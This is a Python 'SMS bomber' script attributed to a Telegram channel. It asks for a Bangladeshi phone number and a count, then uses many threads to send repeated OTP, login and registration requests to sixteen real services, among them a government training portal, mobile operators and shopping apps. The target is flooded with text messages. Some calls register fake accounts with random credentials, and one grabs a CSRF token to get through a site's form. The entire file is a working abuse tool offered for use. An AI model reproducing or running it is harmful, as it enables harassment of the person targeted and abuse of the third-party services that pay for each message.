#Copyright @ISmartCoder
#Updates Channel https://t,me/TheSmartDev
import requests
import random
import string
import threading
import time
from concurrent.futures import ThreadPoolExecutor

def random_string(pattern):
    result = ''
    for char in pattern:
        if char == '?n':
            result += str(random.randint(0, 9))
        elif char == '?l':
            result += random.choice(string.ascii_lowercase)
        elif char == '?i':
            result += random.choice(string.ascii_letters + string.digits)
    return result

def send_request(url, method, headers, data=None):
    try:
        if method == "POST":
            response = requests.post(url, headers=headers, json=data, timeout=10)
        else:
            response = requests.get(url, headers=headers, timeout=10)
        return response
    except:
        return None

def api_1(number, pgen, egen, did, name):
    url = "https://core.easy.com.bd/api/v1/registration"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "core.easy.com.bd",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {
        "password": pgen,
        "password_confirmation": pgen,
        "device_key": did,
        "name": name,
        "mobile": number,
        "email": f"{egen}info@gmail.com"
    }
    return send_request(url, "POST", headers, data)

def api_2(number):
    url = "https://training.gov.bd/backoffice/api/user/sendOtp"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "training.gov.bd",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"mobile": number}
    return send_request(url, "POST", headers, data)

def api_3(number):
    url = "https://auth.qcoom.com/api/v1/otp/send"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "auth.qcoom.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"mobileNumber": f"+88{number}"}
    return send_request(url, "POST", headers, data)

def api_4(number):
    url = "https://api.apex4u.com/api/auth/login"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.apex4u.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"phoneNumber": number}
    return send_request(url, "POST", headers, data)

def api_5(number):
    url = "https://api.osudpotro.com/api/v1/users/send_otp"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.osudpotro.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"os": "web", "mobile": f"+88-{number}", "language": "en", "deviceToken": "web"}
    return send_request(url, "POST", headers, data)

def api_6(number):
    url = "https://api.busbd.com.bd/api/auth"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.busbd.com.bd",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"phone": f"+88{number}"}
    return send_request(url, "POST", headers, data)

def api_7(number):
    url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "bkshopthc.grameenphone.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"phone": number, "language": "en", "email": ""}
    return send_request(url, "POST", headers, data)

def api_8(number):
    url = "https://app.deshal.net/api/auth/login"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "app.deshal.net",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"phone": number}
    return send_request(url, "POST", headers, data)

def api_9(number):
    url = "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api-dynamic.chorki.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"number": f"+88{number}"}
    return send_request(url, "POST", headers, data)

def api_10(number, pgen, egen, name):
    url = "https://regalfurniturebd.com/api/auth/register"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "regalfurniturebd.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {
        "emergency_contact_number": number,
        "password_confirmation": pgen,
        "address": "",
        "address_1": "Dhaka,bd,ch",
        "address_2": "My,won,home",
        "telephone": number,
        "agree": True,
        "device_name": "web_browser",
        "password": pgen,
        "district": "Outside Dhaka",
        "post_code": "200",
        "name": name,
        "company": "dhaka",
        "email": f"{egen}@gmail.com"
    }
    return send_request(url, "POST", headers, data)

def api_11(number):
    url = "https://da-api.robi.com.bd/da-nll/otp/send"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "da-api.robi.com.bd",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"msisdn": number}
    return send_request(url, "POST", headers, data)

def api_12(number):
    url = "https://api.shikho.com/public/activity/otp"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.shikho.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"phone": number, "intent": "ap-discount-request"}
    return send_request(url, "POST", headers, data)

def api_13(number):
    url = "https://api.garibookadmin.com/api/v3/user/login"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.garibookadmin.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"recaptcha_token": "garibookcaptcha", "mobile": number, "channel": "web"}
    return send_request(url, "POST", headers, data)

def api_14(number):
    url = "https://api.pathao.com/v2/auth/register"
    headers = {
        "Accept-Encoding": "gzip",
        "Android-OS": "10",
        "App-Agent": "ride/android/491",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.pathao.com",
        "User-Agent": "okhttp/4.12.0"
    }
    data = {"country_prefix": "880", "national_number": number[1:], "country_id": 1}
    return send_request(url, "POST", headers, data)

def api_15(number):
    url = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    data = {"msisdn": number[1:]}
    return send_request(url, "POST", headers, data)

def api_16(number):
    url = "https://web.hishabee.business/auth"
    headers = {
        "Host": "web.hishabee.business",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=0, i",
        "Connection": "keep-alive"
    }
    response = send_request(url, "GET", headers)
    if response:
        cookies = response.cookies.get_dict()
        cs1 = cookies.get('__Host-authjs.csrf-token', '')
        url = "https://web.hishabee.business/auth/otp"
        headers = {
            "Host": "web.hishabee.business",
            "Cookie": f"__Host-authjs.csrf-token={cs1}; __Secure-authjs.callback-url=https%3A%2F%2Fweb.hishabee.business; mobile_number={number}",
            "Content-Length": "33",
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "Next-Action": "99a8ce094437bb79461fdc714e10a9ff1d2b23a3",
            "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
            "Sec-Ch-Ua-Mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Accept": "text/x-component",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "https://web.hishabee.business",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://web.hishabee.business/auth/otp",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Priority": "u=1, i"
        }
        data = [{"mobile_number": number}]
        return send_request(url, "POST", headers, data)
    return None

def process_number(number, amount):
    apis = [api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_11, api_12, api_13, api_14, api_15, api_16]
    success_count = 0
    for _ in range(amount):
        pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
        egen = random_string("?n?n?n?n?n?n?n?n")
        did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
        name = random_string("?l?l?l?l?l?l")
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            futures.append(executor.submit(api_1, number, pgen, egen, did, name))
            futures.append(executor.submit(api_10, number, pgen, egen, name))
            for api in apis:
                futures.append(executor.submit(api, number))
            for future in futures:
                result = future.result()
                if result and result.status_code == 200:
                    success_count += 1
        time.sleep(1)
    print(f"Successfully sent {success_count} requests to {number}")

def main():
    number = input("Enter BD number without +88 (e.g., 016...): ")
    amount = int(input("Enter the number of requests to send: "))
    threads = []
    for _ in range(min(amount, 10)):
        thread = threading.Thread(target=process_number, args=(number, amount))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()